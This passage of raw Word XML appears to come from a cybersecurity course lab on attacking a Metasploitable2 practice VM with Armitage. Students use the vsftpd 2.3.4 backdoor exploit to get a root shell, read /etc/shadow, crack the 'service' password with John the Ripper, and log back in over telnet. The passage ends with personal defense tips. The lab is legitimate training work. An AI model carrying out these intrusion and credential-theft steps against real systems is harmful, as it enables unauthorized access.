        <w:t xml:space="preserve">Quick Scan. Enter the IP address of </w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>Metasploitable2</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t xml:space="preserve">machine </w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t>(use ifconfig on</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC" w:rsidRPr="00302BEC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t>Metasploitable2 machine to find the IP address)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415633BA" w14:textId="30D40D56" w:rsidR="00302BEC" w:rsidRDefault="00813F46" w:rsidP="00A0538A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>You will see that several ports are open on the Metasploitable2 server at the bottom of the screen</w:t>
      </w:r>
      <w:r w:rsidR="00CE5FA5">
        <w:t>. We will attack these ports.</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230B3C2E" w14:textId="6FA4BFD3" w:rsidR="00302BEC" w:rsidRDefault="00CE5FA5" w:rsidP="00302BEC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>On the middle screen</w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you will see the IP address of Metasploitable2 on a box and popup to Attack it.</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t xml:space="preserve"> Right</w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t xml:space="preserve">click on the host icon and select </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t>services</w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0070189A">
        <w:t>Y</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t>ou will see all the ports and what services are running on them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0110652A" w14:textId="77777777" w:rsidR="00302BEC" w:rsidRPr="00302BEC" w:rsidRDefault="00302BEC" w:rsidP="00302BEC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Attack</w:t>
      </w:r>
      <w:r w:rsidRPr="00302BEC">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> Metasploitable2 from Kali Linux machine:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D05B56D" w14:textId="544ECD92" w:rsidR="00302BEC" w:rsidRDefault="00302BEC" w:rsidP="00712EAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">From </w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Attacks menu on the top, select "Find Attacks". </w:t>
      </w:r>
      <w:r w:rsidR="00936D92">
        <w:t xml:space="preserve">If the scan stops, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00936D92" w:rsidRPr="00936D92">
        <w:t>Go</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00936D92" w:rsidRPr="00936D92">
        <w:t xml:space="preserve"> into /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00936D92" w:rsidRPr="00936D92">
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00936D92" w:rsidRPr="00936D92">
        <w:t>/share/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00936D92" w:rsidRPr="00936D92">
        <w:t>metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00936D92" w:rsidRPr="00936D92">
        <w:t>-framework/modules</w:t>
      </w:r>
      <w:r w:rsidR="00936D92">
        <w:t xml:space="preserve"> folder and delete that particular module </w:t>
      </w:r>
      <w:r w:rsidR="005F3F6B">
        <w:t xml:space="preserve">causing </w:t>
      </w:r>
      <w:r w:rsidR="00F41F95">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="005F3F6B">
        <w:t>problem. R</w:t>
      </w:r>
      <w:r w:rsidR="00F41F95">
        <w:t>erun the sca</w:t>
      </w:r>
      <w:r w:rsidR="00936D92">
        <w:t xml:space="preserve">n. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">A pop will confirm that the scan </w:t>
      </w:r>
      <w:r w:rsidR="004466FF">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> complete.</w:t>
      </w:r>
      <w:r w:rsidR="00936D92">
        <w:t xml:space="preserve"> The box representing the target machine will now have lightning symbols around it showing vulnerabilities are found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0E0725" w14:textId="77777777" w:rsidR="00302BEC" w:rsidRDefault="00302BEC" w:rsidP="00712EAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now, the fun begins. Right click on the box representing Metasploitable2. Select "Attack", "ftp" and "vsftpd_234_backdoor".  Click "Launch" on the next screen. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB89940" w14:textId="2F404529" w:rsidR="00936D92" w:rsidRDefault="00302BEC" w:rsidP="00712EAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Right</w:t>
      </w:r>
      <w:r w:rsidR="00F41F95">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>click on the box. Select "Shell1</w:t>
      </w:r>
      <w:r w:rsidR="00F41F95">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">" and the "interact". You will land on a $ prompt. That's the command prompt of </w:t>
      </w:r>
      <w:r w:rsidR="00B904FA">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>Metasploitable2 server. You</w:t>
      </w:r>
      <w:r w:rsidR="00D4731C">
        <w:t xml:space="preserve"> have hacked the Metasploitable2 server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Type: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEB05C5" w14:textId="3D06E61F" w:rsidR="00302BEC" w:rsidRDefault="00D4731C" w:rsidP="00936D92">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:t>hoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6F440983" w14:textId="33E504B1" w:rsidR="00D4731C" w:rsidRDefault="00D4731C" w:rsidP="00936D92">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t>hostname</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CCC4C9D" w14:textId="73F1CD52" w:rsidR="00936D92" w:rsidRDefault="00936D92" w:rsidP="00936D92">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5EA685" w14:textId="4F3833CD" w:rsidR="00D4731C" w:rsidRDefault="00D4731C" w:rsidP="00936D92">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t>ifco</w:t>
      </w:r>
      <w:r w:rsidR="00B904FA">
        <w:t>nfig</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F490E64" w14:textId="1E3349B5" w:rsidR="00302BEC" w:rsidRDefault="00302BEC" w:rsidP="00712EAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You will be surprised to see that you are </w:t>
      </w:r>
      <w:r w:rsidR="00550D12">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">"root" user on </w:t>
      </w:r>
      <w:r w:rsidR="00550D12">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>Metasploitable2 machine. You can do whatever you want to the server. You can destroy the server</w:t>
      </w:r>
      <w:r w:rsidR="00A44FEC">
        <w:t xml:space="preserve"> if you wish</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B9D22B" w14:textId="309F5442" w:rsidR="00302BEC" w:rsidRDefault="00302BEC" w:rsidP="00302BEC">
      <w:r>
        <w:t>There are many other ways to get i</w:t>
      </w:r>
      <w:r w:rsidR="00936D92">
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00550D12">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> we will explore them in class as time permits.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C08C2C" w14:textId="6B7047F5" w:rsidR="00D9447C" w:rsidRDefault="00D9447C" w:rsidP="00D307B3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D307B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Create backdoor by cracking </w:t>
      </w:r>
      <w:r w:rsidR="00550D12">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D307B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
      <w:r w:rsidR="00D307B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCE3193" w14:textId="77777777" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="00C06D6C" w:rsidP="00C06D6C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>At the $ prompt, type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D50BA14" w14:textId="77777777" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="00C06D6C" w:rsidP="00C06D6C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>cat /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">/shadow </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFF7DC3" w14:textId="140C7202" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="00C06D6C" w:rsidP="00C06D6C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">You will see a list of user ids and hashed passwords separated by </w:t>
      </w:r>
      <w:r w:rsidR="00550D12">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">colon and some more stuff separated by </w:t>
      </w:r>
      <w:r w:rsidR="00550D12">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>colon. Copy the user id and hashed password for "</w:t>
      </w:r>
      <w:r>
        <w:t>service</w:t>
      </w:r>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00887C48" w14:textId="0A18372A" w:rsidR="00936D92" w:rsidRPr="00C06D6C" w:rsidRDefault="00936D92" w:rsidP="00936D92">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">Paste the user id and password in </w:t>
      </w:r>
      <w:r>
        <w:t>a text</w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> hash.txt in </w:t>
      </w:r>
      <w:r w:rsidR="00550D12">
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00B515C0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>/dev folder</w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C442320" w14:textId="77777777" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="00C06D6C" w:rsidP="002F274E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>Type: john -show /dev/hash.txt (we are using john the ripper)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0440DA" w14:textId="77777777" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="00C06D6C" w:rsidP="002F274E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">You will see that the password for </w:t>
      </w:r>
      <w:r>
        <w:t>service</w:t>
      </w:r>
      <w:r w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve"> is "</w:t>
      </w:r>
      <w:r>
        <w:t>service</w:t>
      </w:r>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3738D28F" w14:textId="77777777" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="00C06D6C" w:rsidP="002F274E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>Well, we just found a back door in case the front door closes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F29490" w14:textId="77777777" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="00C06D6C" w:rsidP="002F274E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:lastRenderedPageBreak/>
        <w:t>Lets' try this backdoor now.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3A1F46" w14:textId="1F5693E8" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="00C06D6C" w:rsidP="002F274E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>Go back to Armitage, right</w:t>
      </w:r>
      <w:r w:rsidR="00B515C0">
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">click on </w:t>
      </w:r>
      <w:r w:rsidR="00B515C0">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>Metasploitable2 icon on Armitage and select "login" and then "telnet"</w:t>
      </w:r>
      <w:r w:rsidR="00AB77B5">
        <w:t xml:space="preserve">. Enter </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00AB77B5">
        <w:t>service</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00AB77B5">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00AB77B5">
        <w:t>service</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00AB77B5">
        <w:t xml:space="preserve"> as user id and password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CE746D" w14:textId="36171842" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="005371C8" w:rsidP="002F274E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Right</w:t>
      </w:r>
      <w:r w:rsidR="00B515C0">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>click on the host icon</w:t>
      </w:r>
      <w:r w:rsidR="00B515C0">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and you will see</w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve"> "</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">shell </w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t>2" has been created.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75557C0B" w14:textId="43D417EE" w:rsidR="00C06D6C" w:rsidRPr="00C06D6C" w:rsidRDefault="005371C8" w:rsidP="002F274E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t>ight</w:t>
      </w:r>
      <w:r w:rsidR="00160545">
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">click </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on the host icon </w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t>and select "shell 2" and "interact"</w:t>
      </w:r>
      <w:r w:rsidR="00160545">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD9E103" w14:textId="77777777" w:rsidR="00936D92" w:rsidRDefault="00C06D6C" w:rsidP="002F274E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve">You will be on $ prompt. Type: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311BC443" w14:textId="4724EE2F" w:rsidR="00160545" w:rsidRDefault="00160545" w:rsidP="00936D92">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t>hoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3954563A" w14:textId="0CE337AB" w:rsidR="00160545" w:rsidRDefault="00160545" w:rsidP="00936D92">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t>hostname</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67480375" w14:textId="4EB8FB66" w:rsidR="00936D92" w:rsidRDefault="00160545" w:rsidP="00936D92">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t>Ip address</w:t>
      </w:r>
      <w:r w:rsidR="00C06D6C" w:rsidRPr="00C06D6C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39327486" w14:textId="5D9050A9" w:rsidR="003D18FA" w:rsidRDefault="00730184" w:rsidP="00730184">
      <w:r>
        <w:t xml:space="preserve">Had </w:t>
      </w:r>
      <w:r w:rsidRPr="00C06D6C">
        <w:t>Metasploitable2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> OS and applications were patched, none of these penetration attempts would have been successful. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAD1118" w14:textId="77777777" w:rsidR="00730184" w:rsidRDefault="00730184" w:rsidP="00730184"/>
    <w:p w14:paraId="0D75AC73" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRDefault="003D18FA">
      <w:pPr>
        <w:spacing w:before="160" w:after="320"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="76656C60" w14:textId="77777777" w:rsidR="00426A46" w:rsidRDefault="00426A46" w:rsidP="00426A46">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Final Words on Cyber Defense</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFB8C59" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cyber Defense </w:t>
      </w:r>
      <w:r w:rsidR="00426A46">
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:t>Personal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C43F457" w14:textId="56D984F9" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:r>
        <w:t>As an individual</w:t>
      </w:r>
      <w:r w:rsidR="006E7427">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> what can you do to improve your cyber defe</w:t>
      </w:r>
      <w:r w:rsidR="00426A46">
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>se? Below are few things that could certainly help:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0601AEC9" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Automatic Update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099B0E32" w14:textId="1A039592" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:r>
        <w:t xml:space="preserve">If you are using </w:t>
      </w:r>
      <w:r w:rsidR="006E7427">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Windows machine, </w:t>
      </w:r>
      <w:r w:rsidR="006E7427">
        <w:t>you must</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> turn on automatic update</w:t>
      </w:r>
      <w:r w:rsidR="006E7427">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can check for that by </w:t>
      </w:r>
      <w:r w:rsidR="00B77819">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">search for "Automatic Update" from </w:t>
      </w:r>
      <w:r w:rsidR="00B77819">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">search option. You can do the same thing with a MAC machine, </w:t>
      </w:r>
      <w:r w:rsidR="00B77819">
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">heck out the following </w:t>
      </w:r>
      <w:r w:rsidR="00B77819">
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7C37FB" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRDefault="007A3129" w:rsidP="003D18FA">
      <w:hyperlink r:id="rId14" w:history="1">
        <w:r w:rsidR="003D18FA" w:rsidRPr="00961085">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://support.apple.com/guide/mac-help/get-macos-updates-mchlpx1065/mac</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="647C6B47" w14:textId="1E271243" w:rsidR="003D18FA" w:rsidRPr="003D18FA" w:rsidRDefault="00426A46" w:rsidP="003D18FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Antivirus Software</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142C6D7E" w14:textId="42A3DC3F" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:r>
        <w:t xml:space="preserve">Windows Defender is an </w:t>
      </w:r>
      <w:r w:rsidR="00F9607B">
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>ntivirus software provided by Microsoft. Please make sure it is turned on</w:t>
      </w:r>
      <w:r w:rsidR="00426A46">
        <w:t xml:space="preserve"> if you are using </w:t>
      </w:r>
      <w:r w:rsidR="00F9607B">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00426A46">
        <w:t>Windows machine. You can also install third</w:t>
      </w:r>
      <w:r w:rsidR="00F9607B">
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="00426A46">
        <w:t>party Antivirus to protect yourself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0771476E" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Use VPN on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Public </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WiFi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1FCDF378" w14:textId="23453B26" w:rsidR="003D18FA" w:rsidRPr="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:r>
        <w:t>Never trust a</w:t>
      </w:r>
      <w:r w:rsidR="00426A46">
        <w:t>ny</w:t>
      </w:r>
      <w:r>
